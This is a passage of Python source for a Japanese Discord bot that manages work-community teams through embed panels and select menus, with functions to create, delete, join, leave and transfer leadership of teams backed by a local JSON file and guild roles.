    explain += "このパネルでは自由に作業村でのチームの結成することができます\n"
    explain += "```"
    explain += "\n"
    explain += "> 以下既定の略で記載します。\n"
    explain += "```"
    explain += "・ボイスチャット:VC\n"
    explain += "・テキストチャット:TC\n"    
    explain += "```"
    explain += "\n"
    explain += "> 命名規則（TRの名前のつけ方！）\n"
    explain += "```"
    explain += "・特殊文字の禁止:（・,./\;:]@[-^\<>?_+*}{=~|()!\"#$%&'）など\n"
    explain += "・絵文字禁止:全面禁止\n"
    explain += "・文字制限：１～１００文字\n"
    explain += "```"
    explain += "\n"
    explain += "\n"
    explain += "さて、さっそく下のボタンを選択して新しいチームを作成してみましょう！\n"
    explain += ""
    embed.add_field(name="\u200b", value=explain, inline=False)
    view = discord.ui.View()\
        .add_item(teamCreateButton())\
        .add_item(teamSelectItem())\
        .add_item(closeButtonItem())
    await inter.response.edit_message(embed=embed, view=view)

def teamCreateButton() -> discord.ui.Item:
    return discord.ui.Button(
        custom_id="teamCreateButton",
        label="クリックしてチームを作成",
        )

async def teamCreateModal(inter: discord.Interaction):    
    modal = discord.ui.Modal(custom_id="teamCreateModal", title="～「作業村bot」チーム作成画面～")
    textInput = discord.ui.TextInput(custom_id="teamCreateModalTextInput", label="チームの名前を入力してください", min_length=1, max_length=40)
    modal.add_item(textInput)
    await inter.response.send_modal(modal)


async def teamDeletePanel(inter: discord.Interaction):
    is_leader = isLeader(inter.user.id)

    embed = discord.Embed(title="～「作業村bot」チーム削除パネル～", description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
    explain = ""
    explain += "> **作業村のチーム削除パネルへようこそ**\n"
    explain += "```"
    explain += "このパネルではあなたの所有するチームの削除を行うことができます\n"
    explain += "```"
    explain += "\n"
    explain += "> 仕様\n"
    explain += "```"
    explain += "・「チームリーダー」はチームを所有しているメンバーのことを言い表します。\n"
    explain += "・チームの削除は「チームリーダー」のみ行うことができます"
    explain += "```"
    explain += "\n"
    explain += "\n"
    if is_leader:
        explain += "チームからの脱退を希望する場合はチームの名前を下の選択ボックスから選んでください。\n"
    else:
        explain += "現在、所有中のチームはありません。現在所属中のチームの削除を希望する場合はチームリーダーにご相談ください\n"
    embed.add_field(name="\u200b", value=explain, inline=False)

    view = discord.ui.View()
    if is_leader:
        view.add_item(teamDeleteSelect(inter))
    view.add_item(teamSelectItem())
    view.add_item(closeButtonItem())
    await inter.response.edit_message(embed=embed, view=view)

def teamDeleteSelect(inter: discord.Interaction) -> discord.ui.Item:
    itemSelect = discord.ui.Select(
        custom_id="teamDeleteSelect",
        placeholder="チームを選択",
        )
    for team in getLeaderTeam(inter.user.id):
        itemSelect.add_option(
            label=team,
            value=team
            )
    return itemSelect

def getLeaderTeam(user_id:int):    
    data = getLocalJson('team.json')
    team_list = []
    for k, v in data.items():
        if user_id == int(v['leader_id']):
            team_list.append(k)
    return team_list   

def isLeader(user_id:int):
    return len(getLeaderTeam(user_id)) != 0

async def teamDeleteProcess(inter: discord.Interaction, values: str):
    data = getLocalJson('team.json')
    try:
        for role in await inter.user.guild.fetch_roles():
            if role.name == values:
                await role.delete()
    except Exception as e:
        embed = discord.Embed(title="処理失敗", description="何かが上手くいかなかったようです。開発者にご連絡下さい。。。")
        embed.add_field(name="> 開発者連絡先", value="<@{832869740695126047}>")
        print("error ditected: teamDeleteProcess\nError: ", e)
        await inter.response.send_message(embed=embed)
        return
    del data[values]
    writeLocalJson('team.json', data)
    
    embed = discord.Embed(title="～「作業村bot」チーム削除完了～", description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
    explain = ""
    explain += f'> **該当チーム{values}の削除が完了しました。**\n'
    explain += "```"
    explain += "原則として削除済みチームのデータは復旧できません。\n"
    explain += "もしチームの作成を再度希望する場合はチームを作成しチーム加入希望者を再度一から集めてください。\n"
    explain += "```"
    embed.add_field(name="\u200b", value=explain, inline=False)

    view = discord.ui.View()
    view.add_item(teamSelectItem())
    view.add_item(closeButtonItem())
    await inter.response.edit_message(embed=embed, view=view)


async def teamJoinPanel(inter: discord.Interaction):
    data:dict = getLocalJson('team.json')
    
    def addSelectItem() -> Union[discord.ui.View, int]:
        view = discord.ui.View()
        i = 0
        itemSelect = discord.ui.Select(custom_id="teamJoinPanelSelect", placeholder="チームを選択してください")
        for k, v in data.items():
            if str(inter.user.id) not in v['member_id']:            
                itemSelect.add_option(
                        label=k,
                        value=k
                    )
                i = i + 1
        if i == 0:
            return view, i
        return view.add_item(itemSelect), i
    
    view, i = addSelectItem()

    view.add_item(teamSelectItem())\
        .add_item(closeButtonItem())

    embed = discord.Embed(title="～「作業村bot」チーム加入パネル～", description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
    explain = ""
    explain += "> **作業村のチーム加入パネルへようこそ**\n"
    explain += "```"
    explain += "このパネルでは作業村の既存のチームへ加入することができます。\n"
    explain += "```"
    explain += "> 仕様\n"
    explain += "```"
    explain += "・既存のチームは下の選択ボックスから確認できます。\n"
    explain += "・既存のチームの一覧を詳細表示する場合は下の選択ボックスから「チーム一覧を選択してください」\n"
    explain += "・チームへの加入は原則自由です。\n"
    explain += "```"
    explain += "\n"
    explain += "\n"
    if i == 0:
        explain += "> **現在、参加可能なチームがありません。どうやら全てのチームに所属されているようですね！**\n"
        explain += "入りたい理想のチームが見つけられませんか？良ければ新しくチームを作成してみましょう！\n"
        explain += "パネルの選択ボックスから「チームを作成」を選んで新しいチームを作成できます。\n"
    else:
        explain += "さて、さっそく加入したいチームの名前を下の選択ボックスから選んでみましょう！\n"
    embed.add_field(name="\u200b", value=explain, inline=False)
    
    
    await inter.response.edit_message(embed=embed, view=view)

async def teamJoinProcess(inter: discord.Interaction, value:str):    
    data = getLocalJson('team.json')
    data[value]['member_id'].append(str(inter.user.id))
    writeLocalJson('team.json', data)
    
    for role in await inter.user.guild.fetch_roles():
        if role.name == value:
            await inter.user.add_roles(role)

    embed = discord.Embed(title="～「作業村bot」チームへ加入完了～", description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
    explain = ""
    explain += f'> **{value}チームへの加入が完了しました！**\n'
    embed.add_field(name="\u200b", value=explain, inline=False)
    view = discord.ui.View().add_item(teamSelectItem()).add_item(closeButtonItem())
    await inter.response.edit_message(embed=embed, view=view)
    

async def teamLeavePanel(inter: discord.Interaction):
    view = discord.ui.View()
    # 参加済みチームの取得
    joined_team = getJoinedTeam(str(inter.user.id))
    # 参加済みチームが一つ以上の場合
    if len(joined_team) != 0:
        itemSelect = discord.ui.Select(custom_id="teamLeavePanelSelect", placeholder="チームを選択してください")
        for j_t in joined_team:
            itemSelect.add_option(label=j_t, value=j_t)
        view.add_item(itemSelect)
    # （チームパネル＆パネルを閉じる）の表示
    view.add_item(teamSelectItem())
    view.add_item(closeButtonItem())

    embed = discord.Embed(title="～「作業村bot」チーム脱退パネル～", description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
    explain = ""
    explain += "> **作業村のチーム脱退パネルへようこそ**\n"
    explain += "```"
    explain += "このパネルでは作業村の既存のチームからの脱退を行うことができます。\n"
    explain += "```"
    explain += "> 仕様\n"
    explain += "```"
    explain += "・現在加入しているチームは下の選択ボックスから確認できます。\n"
    explain += "・既存のチームの一覧を詳細表示する場合は下の選択ボックスから「チーム一覧を選択してください」\n"
    explain += "・チームからの脱退は原則自由です。\n"
    explain += "```"
    explain += "\n"
    explain += "\n"
    # 参加済みチームが存在しない場合
    if len(getJoinedTeam(str(inter.user.id))) == 0:
        explain += "> **現在、脱退可能なチームがありません。どうやらどのチームにも所属されていないようですね。**\n"
        explain += "パネルの選択ボックスから「チームに加入」を選んで既存のチームに参加できます。\n"
        explain += "入りたい理想のチームが見つけられませんか？良ければ新しくチームを作成してみましょう！\n"
        explain += "パネルの選択ボックスから「チームを作成」を選んで新しいチームを作成できます。\n"
    else:
        explain += "チームからの脱退を希望する場合はチームの名前を下の選択ボックスから選んでください。\n"
    explain += ""
    embed.add_field(name="\u200b", value=explain, inline=False)
    
    await inter.response.edit_message(embed=embed, view=view)

async def teamLeaveProcess(inter: discord.Interaction, value:str):        
    data:dict = getLocalJson('team.json')
    if str(inter.user.id) == getTeam(value)['leader_id']:
        embed = discord.Embed(title="～「作業村bot」チームからの脱退失敗～", description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
        explain = ""
        explain += f'> **{value}チームからの脱退に失敗しました。**\n'
        explain += "```"
        explain += "チームリーダーは原則としてチームからの脱退が禁止されています。\n"
        explain += "チームリーダーがチームからの脱退を行う場合、原則としてチームメンバーへチームの所有権を譲渡し、これを脱退前に行う必要があります。\n"
        explain += "```"
        embed.add_field(name="\u200b", value=explain, inline=False)
        view = discord.ui.View()
        view.add_item(teamSelectItem())
        view.add_item(closeButtonItem())
        await inter.response.edit_message(embed=embed, view=view)
        return
    
    data[value]['member_id'].remove(str(inter.user.id))
    writeLocalJson('team.json', data)
    
    for role in await inter.user.guild.fetch_roles():
        if role.name == value:
            await inter.user.remove_roles(role)

    embed = discord.Embed(title="～「作業村bot」チームからの脱退完了～", description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
    explain = ""
    explain += f'> **{value}チームからの脱退が完了しました。**\n'
    embed.add_field(name="\u200b", value=explain, inline=False)
    view = discord.ui.View()
    view.add_item(teamSelectItem())
    view.add_item(closeButtonItem())
    await inter.response.edit_message(embed=embed, view=view)

async def teamTransferPanel(inter: discord.Interaction):
    is_leader = isLeader(inter.user.id)

    embed = discord.Embed(title="～「作業村bot」チームリーダー譲渡パネル～", description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
    explain = ""
    explain += "> **作業村のチームリーダー譲渡パネルへようこそ**\n"
    if is_leader:
        explain += "チームリーダーの譲渡を希望する場合は対象のチーム名を下の選択ボックスから選んでください。\n"
    else:
        explain += "現在、所有中のチームはありません。現在所属中のチームのチームリーダーから所有権の譲渡を希望する場合はチームリーダーにご相談ください\n"
    embed.add_field(name="\u200b", value=explain, inline=False)

    view = discord.ui.View()
    if is_leader:
        view.add_item(teamTransferSelect(inter))
    view.add_item(teamSelectItem())
    view.add_item(closeButtonItem())
    await inter.response.edit_message(embed=embed, view=view)    

def teamTransferSelect(inter: discord.Interaction):
    itemSelect = discord.ui.Select(custom_id="teamTransferSelected", placeholder="譲渡対象のチームを選択してください")
    for team in getLeaderTeam(inter.user.id):
        itemSelect.add_option(
            label=team,
            value=team
            )
    return itemSelect

async def teamTransferUserSelect(inter: discord.Interaction, value:str):      
    data:dict = getLocalJson('team.json')
    itemSelect = discord.ui.Select(custom_id="teamTransferUserSelected", placeholder="譲渡先のメンバーを選択してください")
    global thisguild
    member_id_list = data[value]['member_id']
    i = 0
    for member_id in member_id_list:        
        member_name = thisguild.get_member(int(member_id)).name
        valueJSON = {}
        valueJSON['member_id'] = member_id
        valueJSON['teamname'] = value
        if member_id != str(inter.user.id):
            itemSelect.add_option(
                label=member_name,
                value=json.dumps(valueJSON)
                )
            i = i + 1

    if i == 0:
        embed = discord.Embed(title="～「作業村bot」チームリーダー譲渡パネル２～", description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
        explain = ""
        explain += "> **作業村のチームリーダー譲渡パネル２へようこそ**\n"
        explain += "現在、チーム内にメンバーがあなた以外存在しないため、所有権の譲渡機能はお使い頂けません。\n"
        explain += "所有権を譲渡する場合はチームへ新しいメンバーを加入させてください\n"
        embed.add_field(name="\u200b", value=explain, inline=False)
        view = discord.ui.View()\
            .add_item(teamSelectItem())\
            .add_item(closeButtonItem())
        await inter.response.edit_message(embed=embed, view=view)
        return

    embed = discord.Embed(title="～「作業村bot」チームリーダー譲渡パネル２～", description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
    explain = ""
    explain += "> **作業村のチームリーダー譲渡パネル２へようこそ**\n"
    explain += "チームリーダーの譲渡先メンバーを下の選択ボックスから選んでください。\n"
    embed.add_field(name="\u200b", value=explain, inline=False)
    view = discord.ui.View()\
        .add_item(itemSelect)\
        .add_item(teamSelectItem())\
        .add_item(closeButtonItem())
    await inter.response.edit_message(embed=embed, view=view)
    
async def teamTransferUserSelectProcess(inter: discord.Interaction, value:str):    
    data:dict = getLocalJson('team.json')

    transfer_value = json.loads(value)
    member_id = transfer_value['member_id']
    teamname = transfer_value['teamname']

    data[teamname]['leader_id'] = member_id
    
    writeLocalJson('team.json', data)

    embed = discord.Embed(title="～チームリーダーの譲渡完了～", description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
    explain = ""
    explain += f'> **{teamname}チームの所有権を{member_id}に譲渡しました！**\n'
    explain += "```"
    explain += "チームリーダーのお勤めご苦労様でした。今後も引き続きチーム機能のご利用をお楽しみください！\n"
    explain += "```"

    embed.add_field(name="\u200b", value=explain, inline=False)
    view = discord.ui.View().add_item(teamSelectItem()).add_item(closeButtonItem())
    await inter.response.edit_message(embed=embed, view=view)
    return
            

    data[value]['member_id'].remove(str(inter.user.id))
    writeLocalJson('team.json', data)
    
    for role in await inter.user.guild.fetch_roles():
        if role.name == value:
            await inter.user.remove_roles(role)

    embed = discord.Embed(title="～「作業村bot」チームからの脱退完了～", description="いつも作業村をご利用頂きありがとうございます。\u200b", color=0x9800ff)
    explain = ""
    explain += f'> **{value}チームからの脱退が完了しました。**\n'
    embed.add_field(name="\u200b", value=explain, inline=False)
    view = discord.ui.View().add_item(teamSelectItem()).add_item(closeButtonItem())
    await inter.response.edit_message(embed=embed, view=view)
    

def teamSelectItem() -> discord.ui.Item:
    itemSelect = discord.ui.Select(
        custom_id="roleSelect",
        placeholder="クリックしてパネルを選択",
        )
    itemSelect.add_option(
        label="チームの表示",
        value="roleShowSelected"
        )
    itemSelect.add_option(
        label="チームを作成",
        value="roleCreateSelected"
        )
    itemSelect.add_option(
        label="チームを削除",
        value="roleDeleteSelected"
        )
    itemSelect.add_option(
        label="チームに加入",
        value="roleJoinSelected"
        )
    itemSelect.add_option(
        label="チームから脱退",
        value="roleLeaveSelected"
        )
    itemSelect.add_option(
        label="リーダーの権限を譲渡",
        value="roleTransferSelected"
        )
    itemSelect.add_option(
        label="チームを編集",
        value="roleEditSelected"
        )
    return itemSelect


#keep_alive()
client.run(DISCORD_TOKEN)